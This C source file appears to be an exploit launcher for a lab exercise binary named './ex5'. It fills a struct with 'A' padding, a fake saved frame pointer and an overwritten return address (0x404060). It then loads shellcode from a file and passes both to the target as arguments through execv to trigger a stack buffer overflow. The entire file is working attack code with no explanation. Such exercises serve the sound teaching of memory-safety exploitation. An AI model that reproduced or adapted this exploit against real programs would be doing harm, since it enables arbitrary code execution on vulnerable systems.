#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>

struct {
  uint8_t buf[32];
  uint64_t saved_ebp;
  uint32_t return_addr;
  char null;
} overflow;

unsigned char shellcode[4096];

int main (int argc, char *argv[]) {
  int fd;
  memset(&overflow, 'A', sizeof(overflow));
  overflow.null = 0;

  overflow.saved_ebp = 0x4242424242424242;
  overflow.return_addr = 0x404060;

  memset(shellcode, 0, sizeof(shellcode));
  fd = open("shellcode", O_RDONLY);
  read(fd, shellcode, sizeof(shellcode));
  close(fd);

  char *const exec_argv[] = {
    "./ex5",
    (char*)shellcode,
    (char*)&overflow,
    NULL
  };

  execv(exec_argv[0], exec_argv);

  return EXIT_SUCCESS;
}
